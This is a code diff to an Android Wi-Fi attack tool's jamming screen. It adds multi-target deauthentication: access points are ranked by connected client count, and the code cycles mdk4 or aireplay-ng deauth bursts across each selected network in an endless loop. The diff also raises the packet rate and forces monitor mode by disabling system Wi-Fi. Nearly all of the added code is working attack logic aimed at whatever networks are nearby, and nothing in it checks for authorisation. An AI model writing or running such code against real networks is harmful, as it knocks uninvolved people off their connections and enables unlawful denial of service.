@@ -195,38 +195,276 @@ public class WifiJamFragment extends Fragment {
 
     private void pickTargetFromScan(Mode mode, boolean required) {
         ArrayList<WiFINetwork> nets = loadScanNetworks();
+        // Prefer networks with most clients first
+        java.util.Collections.sort(nets, (a, b) -> {
+            int c = Integer.compare(b.getClientCount(), a.getClientCount());
+            if (c != 0) return c;
+            return Integer.compare(a.getPower(), b.getPower());
+        });
         if (nets.isEmpty()) {
             new MaterialAlertDialogBuilder(context)
                     .setTitle(mode.title)
-                    .setMessage("No WiFi scan data yet. Scan in WiFi networks first, or enter manually.")
+                    .setMessage("No WiFi scan data yet. Use Monitor + clients scan first, or enter manually.")
                     .setPositiveButton("Enter manually", (d, w) -> promptManual(mode, required))
                     .setNegativeButton(android.R.string.cancel, null)
                     .show();
             return;
         }
 
-        CharSequence[] labels = new CharSequence[nets.size() + 1];
+        CharSequence[] labels = new CharSequence[nets.size()];
+        boolean[] checked = new boolean[nets.size()];
         for (int i = 0; i < nets.size(); i++) {
             WiFINetwork n = nets.get(i);
             String ssid = n.getSsid() == null || n.getSsid().isEmpty() ? "<hidden>" : n.getSsid();
+            int cc = n.getClientCount();
             labels[i] = ssid + "\n" + n.getMac() + "  ·  ch " + n.getChannel()
-                    + "  ·  " + n.getPower() + " dBm";
+                    + "  ·  " + n.getPower() + " dBm"
+                    + (cc > 0 ? "  ·  " + cc + " clients" : "");
         }
-        labels[nets.size()] = "Enter manually…";
 
         new MaterialAlertDialogBuilder(context)
-                .setTitle("Select target AP")
-                .setItems(labels, (d, which) -> {
-                    if (which >= nets.size()) {
-                        promptManual(mode, required);
+                .setTitle("Select target AP(s)")
+                .setMultiChoiceItems(labels, checked, (d, which, isChecked) -> checked[which] = isChecked)
+                .setPositiveButton("Attack selected", (d, w) -> {
+                    ArrayList<WiFINetwork> selected = new ArrayList<>();
+                    for (int i = 0; i < checked.length; i++) {
+                        if (checked[i]) selected.add(nets.get(i));
+                    }
+                    if (selected.isEmpty()) {
+                        if (required) {
+                            core.toaster("Select at least one AP");
+                            return;
+                        }
+                        launchMdk4(activity, context, core, mode.flag, mode.title,
+                                null, null, -1, null);
                         return;
                     }
-                    WiFINetwork n = nets.get(which);
-                    launchMdk4(activity, context, core, mode.flag, mode.title,
-                            n.getMac(), n.getSsid(), n.getChannel(), null);
+                    if (selected.size() == 1) {
+                        WiFINetwork n = selected.get(0);
+                        launchMdk4(activity, context, core, mode.flag, mode.title,
+                                n.getMac(), n.getSsid(), n.getChannel(), null);
+                    } else {
+                        pickEngineThenMulti(mode, selected);
+                    }
+                })
+                .setNeutralButton("Enter manually…", (d, w) -> promptManual(mode, required))
+                .setNegativeButton(android.R.string.cancel, null)
+                .show();
+    }
+
+    private void pickEngineThenMulti(Mode mode, ArrayList<WiFINetwork> selected) {
+        // aireplay only makes sense for deauth; other modes stay mdk4-only
+        if (!"d".equals(mode.flag)) {
+            pickBurstThenMulti(mode.title + " · mdk4 ×" + selected.size(), selected, true, mode.flag);
+            return;
+        }
+        new MaterialAlertDialogBuilder(context)
+                .setTitle("Attack engine · " + selected.size() + " APs")
+                .setItems(new CharSequence[]{
+                        "mdk4 (fast, recommended)",
+                        "aireplay-ng (classic deauth)"
+                }, (d, which) -> {
+                    if (which == 1) {
+                        pickBurstThenMulti("aireplay · ×" + selected.size(), selected, false, "d");
+                    } else {
+                        pickBurstThenMulti(mode.title + " · mdk4 ×" + selected.size(),
+                                selected, true, mode.flag);
+                    }
                 })
                 .setNegativeButton(android.R.string.cancel, null)
                 .show();
+    }
+
+    /** Ask how long each AP burst should run (persisted). */
+    private void pickBurstThenMulti(String title, ArrayList<WiFINetwork> selected,
+                                    boolean useMdk4, String mdkFlag) {
+        java.util.Collections.sort(selected, (a, b) -> Integer.compare(a.getChannel(), b.getChannel()));
+        int saved = core.getInt("jam_multi_burst_sec");
+        if (saved <= 0) saved = 2;
+        CharSequence[] items = new CharSequence[]{
+                "1 second per AP",
+                "2 seconds per AP",
+                "3 seconds per AP",
+                "5 seconds per AP",
+                "10 seconds per AP",
+                "Custom…"
+        };
+        // Highlight last used in title
+        new MaterialAlertDialogBuilder(context)
+                .setTitle("Burst duration (last: " + saved + "s)")
+                .setItems(items, (d, which) -> {
+                    if (which == 5) {
+                        final TextInputEditText edit = new TextInputEditText(context);
+                        edit.setInputType(InputType.TYPE_CLASS_NUMBER);
+                        edit.setHint("Seconds per AP (1–30)");
+                        edit.setText(String.valueOf(saved));
+                        new MaterialAlertDialogBuilder(context)
+                                .setTitle("Custom burst duration")
+                                .setView(edit)
+                                .setPositiveButton(android.R.string.ok, (dd, ww) -> {
+                                    try {
+                                        int s = Integer.parseInt(String.valueOf(edit.getText()).trim());
+                                        s = Math.max(1, Math.min(30, s));
+                                        core.putInt("jam_multi_burst_sec", s);
+                                        launchMultiSession(title, selected, useMdk4, mdkFlag, s);
+                                    } catch (Exception ignored) {
+                                        core.toaster("Invalid number");
+                                    }
+                                })
+                                .setNegativeButton(android.R.string.cancel, null)
+                                .show();
+                        return;
+                    }
+                    int[] secs = {1, 2, 3, 5, 10};
+                    int s = secs[which];
+                    core.putInt("jam_multi_burst_sec", s);
+                    launchMultiSession(title, selected, useMdk4, mdkFlag, s);
+                })
+                .setNegativeButton(android.R.string.cancel, null)
+                .show();
+    }
+
+    private void launchMultiSession(String title, ArrayList<WiFINetwork> targets,
+                                    boolean useMdk4, String mdkFlag, int burstSec) {
+        if (activity == null || context == null || core == null || targets == null || targets.isEmpty()) {
+            return;
+        }
+        final int burst = Math.max(1, Math.min(30, burstSec <= 0 ? 2 : burstSec));
+        final long session = SESSION.incrementAndGet();
+        final Dialog dialog = new Dialog(context);
+        dialog.setContentView(R.layout.wifi_dialog_hs);
+        Window window = dialog.getWindow();
+        if (window != null) {
+            window.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
+            window.setLayout(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
+        }
+        dialog.setCancelable(false);
+        View outputcard = dialog.findViewById(R.id.output_card);
+        TextView outputtext = dialog.findViewById(R.id.wifi_output);
+        TextView resulttext = dialog.findViewById(R.id.wifi_result);
+        MaterialButton stop = dialog.findViewById(R.id.stop);
+        TextView scanText = dialog.findViewById(R.id.scan_text);
+        scanText.setText(title);
+        MaterialCardView info_card = dialog.findViewById(R.id.info_card);
+        info_card.setVisibility(View.GONE);
+        resulttext.setVisibility(View.GONE);
+        outputcard.setVisibility(View.VISIBLE);
+        outputtext.setMovementMethod(new ScrollingMovementMethod());
+        append(outputtext, "=== Multi-target · " + targets.size() + " APs · " + burst + "s/AP ===");
+        for (WiFINetwork n : targets) {
+            append(outputtext, " • " + n.getSsid() + " (" + n.getMac() + ") ch" + n.getChannel()
+                    + " clients=" + n.getClientCount());
+        }
+
+        final boolean[] stopped = {false};
+
+        new Thread(() -> {
+            try {
+                String deauthRaw = core.getString("wlan_deauth");
+                if (deauthRaw == null || deauthRaw.isEmpty()) deauthRaw = "wlan0";
+                appendUi(activity, outputtext, "Enabling monitor on " + deauthRaw + "…");
+                if (SESSION.get() != session) return;
+                boolean ok = core.monitorManager.enableMonitorMode(deauthRaw);
+                if (!ok) {
+                    core.customCommand("svc wifi disable", true);
+                    try { Thread.sleep(500); } catch (InterruptedException ignored) {}
+                    ok = core.monitorManager.enableMonitorMode(deauthRaw);
+                }
+                if (!ok) {
+                    finishUi(activity, outputtext, resulttext, stop, dialog, "Monitor failed");
+                    return;
+                }
+                String iface = core.getDeauthInterface();
+                appendUi(activity, outputtext, "Monitor up · " + iface + " · settling 1s · burst "
+                        + burst + "s/AP");
+                try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
+
+                int round = 0;
+                while (!stopped[0] && SESSION.get() == session) {
+                    round++;
+                    for (WiFINetwork n : targets) {
+                        if (stopped[0] || SESSION.get() != session) break;
+                        String mac = n.getMac() == null ? "" : n.getMac().trim();
+                        if (mac.isEmpty()) continue;
+                        int ch = n.getChannel();
+                        if (ch > 0) {
+                            core.lockWifiChannel(iface, String.valueOf(ch));
+                            try { Thread.sleep(200); } catch (InterruptedException ignored) {}
+                        }
+                        String cmd;
+                        if (useMdk4) {
+                            String f = (mdkFlag == null || mdkFlag.isEmpty()) ? "d" : mdkFlag.toLowerCase(Locale.US);
+                            String ssid = n.getSsid();
+                            if (ssid != null) {
+                                ssid = ssid.replace("\"", "").replace("'", "").replace(";", "")
+                                        .replace("|", "").replace("&", "").replace("`", "").trim();
+                                if (ssid.isEmpty() || "<hidden>".equalsIgnoreCase(ssid)) ssid = null;
+                            }
+                            String base = buildMdk4Command(iface, f, mac, ssid, ch, null);
+                            cmd = "timeout " + burst + " " + base
+                                    + " 2>&1 || ( " + base
+                                    + " >/dev/null 2>&1 & sleep " + burst
+                                    + "; killall mdk4 2>/dev/null; true )";
+                        } else {
+                            cmd = "timeout " + burst + " aireplay-ng --ignore-negative-one -0 0 -a " + mac
+                                    + " " + iface + " 2>&1 || ("
+                                    + "aireplay-ng --ignore-negative-one -0 64 -a " + mac + " " + iface
+                                    + " >/dev/null 2>&1 & sleep " + burst
+                                    + "; killall aireplay-ng 2>/dev/null; true)";
+                        }
+                        appendUi(activity, outputtext, "[r" + round + "] " + n.getSsid()
+                                + " ch" + ch + " · " + burst + "s → "
+                                + (useMdk4 ? "mdk4" : "aireplay"));
+                        ArrayList<String> out = core.customChrootCommand(cmd);
+                        int shown = 0;
+                        for (String line : out) {
+                            if (line == null) continue;
+                            String t = line.trim();
+                            if (t.isEmpty()) continue;
+                            if (t.contains("Waiting for beacon") || t.contains("No such device")) {
+                                appendUi(activity, outputtext, "  ! " + t);
+                            } else if (shown < 4 && (t.contains("packets") || t.contains("DeAuth")
+                                    || t.contains("Sending") || t.contains("mdk4"))) {
+                                appendUi(activity, outputtext, "  " + t);
+                                shown++;
+                            }
+                        }
+                    }
+                    appendUi(activity, outputtext, "--- round " + round + " done · looping ---");
+                    try { Thread.sleep(300); } catch (InterruptedException ignored) {}
+                }
+            } catch (Exception e) {
+                appendUi(activity, outputtext, "Error: " + e.getMessage());
+            } finally {
+                try { core.killWifiAttackTools(); } catch (Exception ignored) {}
+                activity.runOnUiThread(() -> {
+                    if (!stopped[0]) {
+                        resulttext.setVisibility(View.VISIBLE);
+                        resulttext.setText("Attack finished / stopped");
+                        stop.setVisibility(View.GONE);
+                        dialog.setCancelable(true);
+                    }
+                });
+            }
+        }, "multi-jam").start();
+
+        stop.setOnClickListener(v -> {
+            stopped[0] = true;
+            SESSION.incrementAndGet();
+            new Thread(() -> {
+                try {
+                    core.killWifiAttackTools();
+                    core.monitorManager.disableMonitorMode(core.getDeauthInterface());
+                } catch (Exception ignored) {
+                }
+            }).start();
+            append(outputtext, "Stopping…");
+            stop.setVisibility(View.GONE);
+            dialog.setCancelable(true);
+            resulttext.setVisibility(View.VISIBLE);
+            resulttext.setText("Attack stopped");
+        });
+        dialog.show();
     }
 
     private void promptManual(Mode mode, boolean required) {
@@ -450,10 +688,10 @@ public class WifiJamFragment extends Fragment {
         if (s != null && s.isEmpty()) s = null;
 
         switch (f) {
-            case "d": // Deauth — -B BSSID, -E ESSID. -c is hop list, not single channel.
+                case "d": // Deauth — -B BSSID, -E ESSID. -c is hop list, not single channel.
                 if (b != null && !b.isEmpty()) sb.append(" -B ").append(b);
                 if (s != null) sb.append(" -E \"").append(s.replace("\"", "")).append('"');
-                sb.append(" -s 80");
+                sb.append(" -s 200");
                 break;
             case "b": // Beacon — -n SSID, -c chan, -m OUI. NEVER -t as BSSID (-t = adhoc type).
                 if (s != null) sb.append(" -n \"").append(s.replace("\"", "")).append('"');
